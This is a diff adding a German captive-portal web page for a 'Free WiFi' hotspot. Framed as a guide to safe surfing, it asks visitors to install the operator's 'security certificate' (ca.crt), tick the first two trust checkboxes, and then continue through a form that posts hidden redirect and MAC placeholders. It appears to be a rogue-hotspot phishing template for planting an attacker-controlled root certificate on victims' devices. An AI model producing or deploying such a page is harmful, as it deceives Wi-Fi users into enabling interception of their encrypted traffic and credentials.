@@ -1,0 +1,79 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>WLAN-Wunderland - sicher surfen</title>
+<link href="style.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+
+
+<div id="container">
+    <div id="header" class="gradient">
+            <div id="logo"><a href="#"><span class="blue">Free</span> WiFi</a></div>
+
+    </div>
+    
+    <div id="main" class="gradient_rev">
+        <div id="content" class="gradient border2">
+        
+        <div id="text">
+
+
+          <p><h1>Anleitung</h1></p>
+                <p><h2>zum sicheren surfen in unserem Free-WLAN<br /> </h2><hr>
+
+		<p><h3>
+			<form action="ca.crt" >
+				Bitte klicken Sie auf 
+				<input name="Zert" type="submit" value="Zertifikat installieren ">
+				, um unser Sicherheitszertifikat zu installieren.
+			</form>
+			<br>
+			<br>
+			Danach erhalten Sie folgende Meldung:<br>
+			<br>
+			<img src="images/screen.jpg">
+			<br>
+			<br>
+			Hier bitte wie angezeigt die beiden ersten K&auml;stchen aktivieren und mit <b>"OK" </b> best&auml;tigen.<br>
+			<br>
+			<hr>
+			<br>
+			<br>
+			Sie k&ouml;nnen sich auch das zu installierende Sicherheitszertifikat anschauen, indem Sie auf <b>"Ansicht" </b>klicken.<br>
+			Hier bitte darauf achten, dass dieses Zertifikat von uns ausgestellt wurde (siehe Bild).<br>
+			<br>
+			<img src="images/zert.jpg"> 
+			<br>
+			<br>
+			Nach Abschluss der Installation, k&ouml;nnen sie mit dem Button "zum Internet" surfen.
+			<br>
+			<br>
+        </h3></p>
+
+					
+			<form method="post" action="/redirect.php" name="fire_form">
+			<input name="b64redirurl" type="hidden" value="placeholder_b64redirurl">
+			<input name="mac" type="hidden" value="placeholder_mac">
+			<input name="fire" type="submit" value="zum Internet" onclick="javascript:alert('Sollten Sie nicht automatisch weitergeleitet werden geben Sie Ihre Zielseite von Hand im Browser ein')">
+			</form>
+
+                <p><br /><br /></p>
+
+         </div><!-- end text -->
+	</div><!-- end content -->
+    </div><!-- end main -->
+
+
+
+
+    <div id="footer" class="gradient">
+		<div id="left_footer">
+			&copy; Copyright 2017 the Provider
+		</div>
+	</div>
+
+
+</body>
+</html>
